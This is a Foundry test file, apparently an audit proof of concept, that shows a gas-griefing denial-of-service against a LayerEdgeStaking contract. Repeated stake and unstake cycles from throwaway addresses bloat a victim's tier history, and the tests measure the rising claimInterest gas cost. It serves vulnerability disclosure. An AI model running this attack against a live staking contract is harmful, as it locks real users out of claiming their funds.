// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/LayerEdgeStaking.sol";

contract MockERC20 {
    string public name = "MOCK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        require(balanceOf[msg.sender] >= a, "bal");
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        require(balanceOf[f] >= a, "bal");
        require(allowance[f][msg.sender] >= a, "allow");
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
}

contract PoC is Test {
    LayerEdgeStaking staking;
    MockERC20 token;
    address victim;
    address control;

    function setUp() public {
        token = new MockERC20();
        staking = new LayerEdgeStaking();
        staking.initialize(address(token), address(this));
        staking.setMinStakeAmount(1000e18);
        token.mint(address(this), 1e27);
        token.approve(address(staking), type(uint256).max);
        staking.depositRewards(1_000_000e18);

        for (uint256 i = 0; i < 14; i++) {
            address u = address(uint160(1000 + i));
            token.mint(u, 10_000e18);
            vm.prank(u); token.approve(address(staking), type(uint256).max);
            vm.prank(u); staking.stake(1000e18);
            if (i == 2) victim = u;
            if (i == 0) control = u;
        }
    }

    function _cycle(uint256 k) internal {
        address h = address(uint160(100_000 + k));
        token.mint(h, 5_000e18);
        vm.prank(h); token.approve(address(staking), type(uint256).max);
        vm.prank(h); staking.stake(1000e18);
        vm.warp(block.timestamp + 60);
        vm.prank(h); staking.unstake(1000e18);
        vm.warp(block.timestamp + 60);
    }

    function _run(uint256 cycles) internal returns (uint256 len, uint256 used, uint256 usedCtl) {
        uint256 start = block.timestamp;
        for (uint256 k = 0; k < cycles; k++) _cycle(k);

        len = staking.stakerTierHistoryLength(victim);
        uint256 g0 = gasleft();
        vm.prank(victim); staking.claimInterest();
        used = g0 - gasleft();

        uint256 g1 = gasleft();
        vm.prank(control); staking.claimInterest();
        usedCtl = g1 - gasleft();
    }

    function test_gasBomb_150() public {
        (uint256 len, uint256 used, uint256 usedCtl) = _run(150);
        emit log_named_uint("cycles", 150);
        emit log_named_uint("victim history len", len);
        emit log_named_uint("victim claim gas", used);
        emit log_named_uint("control claim gas", usedCtl);
        emit log_named_uint("marginal gas per entry", (used - usedCtl) / len);
        assertGt(len, 2 * 150 - 10, "history did not grow");
        assertGt(used, usedCtl, "gas must grow with history");
    }

    function test_gasBomb_300() public {
        (uint256 len, uint256 used, uint256 usedCtl) = _run(300);
        emit log_named_uint("cycles", 300);
        emit log_named_uint("victim history len", len);
        emit log_named_uint("victim claim gas", used);
        emit log_named_uint("control claim gas", usedCtl);
        emit log_named_uint("marginal gas per entry", (used - usedCtl) / len);
        emit log_named_uint("projected entries to 30M gas", 30_000_000 / ((used - usedCtl) / len));
        assertGt(len, 2 * 300 - 10, "history did not grow");
        assertGt(used, usedCtl, "gas must grow with history");
    }
}